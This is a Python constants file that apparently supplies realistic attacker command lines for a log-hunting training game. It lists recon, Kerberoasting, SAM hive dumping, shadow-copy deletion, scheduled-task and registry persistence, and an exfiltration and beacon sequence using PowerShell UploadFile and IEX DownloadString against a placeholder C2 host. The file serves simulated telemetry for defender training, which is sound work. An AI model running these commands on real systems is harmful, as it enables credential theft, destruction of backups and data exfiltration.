"""
Constants used by the advanced attack generators.

These provide realistic command lines, service principal names, internal server
names, cloud applications, and geographic locations so the generated telemetry
looks plausible to a player hunting through the logs.
"""

# ---------------------------------------------------------------------------
# Discovery (discovery:automated_recon)
# A dense burst of host-recon commands that a normal office worker never runs.
# Each entry is (parent_process_name, process_commandline).
# ---------------------------------------------------------------------------
DISCOVERY_COMMANDS = [
    'net group "Domain Admins" /domain',
    "net group \"Enterprise Admins\" /domain",
    "nltest /dclist:contoso",
    "nltest /domain_trusts",
    "net user /domain",
    "net accounts /domain",
    "arp -a",
    "ipconfig /all",
    "whoami /groups",
    "systeminfo",
    "tasklist /v",
    "net localgroup administrators",
    "query user",
    "route print",
]

# Parent processes a hands-on-keyboard operator spawns discovery from
DISCOVERY_PARENT_PROCESSES = ["cmd.exe", "powershell.exe"]


# ---------------------------------------------------------------------------
# Kerberoasting (identity:kerberoasting)
# High-value Service Principal Names an attacker would request tickets for.
# {domain} is replaced with the company's short domain name at generation time.
# ---------------------------------------------------------------------------
HIGH_VALUE_SPNS = [
    "MSSQLSvc/sql01.{domain}:1433",
    "MSSQLSvc/sql-prod.{domain}:1433",
    "HTTP/sharepoint.{domain}",
    "HTTP/intranet.{domain}",
    "CIFS/fileserver01.{domain}",
    "LDAP/dc01.{domain}",
    "TERMSRV/jumpbox01.{domain}",
    "exchangeMDB/mail01.{domain}",
]

# RC4 encryption downgrade is the tell-tale of Kerberoasting
KERBEROAST_ENCRYPTION_TYPE = "0x17 - RC4-HMAC"
KERBEROAST_TICKET_OPTIONS = "0x40810000"

# Domain controllers where 4769 events are logged
DOMAIN_CONTROLLERS = ["DC01", "DC02"]


# ---------------------------------------------------------------------------
# Lateral movement via PsExec (execution:psexec_lateral)
# ---------------------------------------------------------------------------
INTERNAL_SERVERS = [
    "SQL01", "SQL-PROD", "FILESERVER01", "APP01", "APP02",
    "JUMPBOX01", "HR-APP01", "FINANCE01", "BACKUP01",
]

# The service binary names PsExec (and renamed clones) drop on the target
PSEXEC_SERVICE_BINARIES = ["PSEXESVC.exe", "PSEXESVC.exe", "winsvc.exe", "msupdate.exe"]


# ---------------------------------------------------------------------------
# Defense evasion (evasion:log_clearing)
# A small set of "what the attacker did right before the lights went out".
# ---------------------------------------------------------------------------
PRE_CLEARING_COMMANDS = [
    "net user svc_admin P@ssw0rd! /add /domain",
    "net localgroup administrators svc_admin /add",
    "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save",
    "vssadmin delete shadows /all /quiet",
]


# ---------------------------------------------------------------------------
# Persistence (persistence:scheduled_task / persistence:registry_run)
# {payload_path} and {payload_name} are filled in at generation time.
# ---------------------------------------------------------------------------
SCHEDULED_TASK_COMMANDS = [
    'schtasks.exe /create /tn "MicrosoftEdgeUpdateTask" /tr "{payload_path}" /sc daily /st 08:00 /ru SYSTEM',
    'schtasks.exe /create /tn "GoogleUpdateTaskMachine" /tr "{payload_path}" /sc onlogon /ru SYSTEM',
    'schtasks.exe /create /tn "OneDriveStandaloneUpdate" /tr "{payload_path}" /sc hourly /ru SYSTEM',
]

REGISTRY_RUN_COMMANDS = [
    'reg.exe add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v EdgeUpdate /t REG_SZ /d "{payload_path}" /f',
    'reg.exe add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v SecurityHealth /t REG_SZ /d "{payload_path}" /f',
    'reg.exe add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" /v Update /t REG_SZ /d "{payload_path}" /f',
]

PERSISTENCE_PAYLOAD_LOCATIONS = [
    "C:\\Users\\{username}\\AppData\\Roaming\\{payload_name}",
    "C:\\ProgramData\\{payload_name}",
    "C:\\Windows\\Temp\\{payload_name}",
]

DEFAULT_PERSISTENCE_PAYLOAD_NAMES = ["svchost-update.exe", "winupdate.exe", "edgehelper.exe"]


# ---------------------------------------------------------------------------
# Hands-on-keyboard operator activity (hands_on_keyboard:operator)
# Interactive post-compromise commands an operator types through their C2 channel:
# local collection, archiving/staging, and beaconing. {ip_address} and {domain_name}
# are replaced with the actor's C2 infrastructure at generation time. Each entry is
# (process_name, commandline).
# ---------------------------------------------------------------------------
HANDS_ON_KEYBOARD_COMMANDS = [
    ("cmd.exe", 'cmd.exe /c dir C:\\Users\\ /s /b | findstr /i "passw .docx .xlsx .pdf .pst"'),
    ("powershell.exe", 'powershell.exe -nop -w hidden -c "Get-ChildItem -Path C:\\Users -Recurse -Include *.docx,*.xlsx,*.pdf | Select FullName"'),
    ("powershell.exe", 'powershell.exe Compress-Archive -Path C:\\Users\\*\\Documents -DestinationPath C:\\Windows\\Temp\\stage.zip -Force'),
    ("cmd.exe", 'cmd.exe /c rar.exe a -m5 -hp******** C:\\Windows\\Temp\\data.rar C:\\Windows\\Temp\\stage.zip'),
    ("cmd.exe", "cmd.exe /c net use \\\\{ip_address}\\share /user:svc_backup ********"),
    ("powershell.exe", 'powershell.exe -nop -c "(New-Object Net.WebClient).UploadFile(\'http://{domain_name}/upload\', \'C:\\Windows\\Temp\\data.rar\')"'),
    ("cmd.exe", "cmd.exe /c nltest /dclist:."),
    ("powershell.exe", 'powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://{domain_name}/beacon\')"'),
]


# ---------------------------------------------------------------------------
# Cloud attacks (cloud:session_hijacking / cloud:token_theft / cloud:exfiltration_via_storage)
# ---------------------------------------------------------------------------
CLOUD_APPLICATIONS = [
    "Office 365 SharePoint Online",
    "Office 365 Exchange Online",
    "Microsoft Teams",
    "AWS S3 Console",
    "Azure Portal",
]

# "Domestic" locations representing where a user normally signs in from
HOME_LOCATIONS = [
    ("New York", "United States"),
    ("Chicago", "United States"),
    ("Austin", "United States"),
    ("Seattle", "United States"),
]

# Foreign locations used for the "impossible travel" second leg
IMPOSSIBLE_TRAVEL_LOCATIONS = [
    ("Moscow", "Russia"),
    ("Beijing", "China"),
    ("Lagos", "Nigeria"),
    ("Tehran", "Iran"),
    ("Pyongyang", "North Korea"),
]

CLOUD_STORAGE_BUCKETS = [
    "contoso-finance-backups",
    "contoso-hr-records",
    "contoso-source-code",
    "contoso-customer-data",
]

CLOUD_STORAGE_OBJECT_KEYS = [
    "exports/payroll_2023.csv",
    "exports/customer_pii.csv",
    "backups/database_dump.sql",
    "hr/employee_records.xlsx",
    "legal/contracts.zip",
    "finance/q4_financials.xlsx",
]


# ---------------------------------------------------------------------------
# Editable content packs (#4)
# A YAML pack at app/game_configs/content_packs/realism.yaml may override any of the
# lists above without code changes. The in-code values above are the defaults / fallback
# — a missing pack, a missing key, or a malformed value keeps them. Guarded so a bad pack
# can never break import.
# ---------------------------------------------------------------------------
try:
    from app.server.modules.content_packs.content_pack import (
        apply_overrides as _apply_overrides,
        PACK_LIST_KEYS as _PACK_LIST_KEYS,
        PACK_PAIR_KEYS as _PACK_PAIR_KEYS,
    )
    _apply_overrides(globals(), _PACK_LIST_KEYS, _PACK_PAIR_KEYS)
except Exception as _e:  # never let a content pack break import
    print("content_pack overrides skipped:", _e)
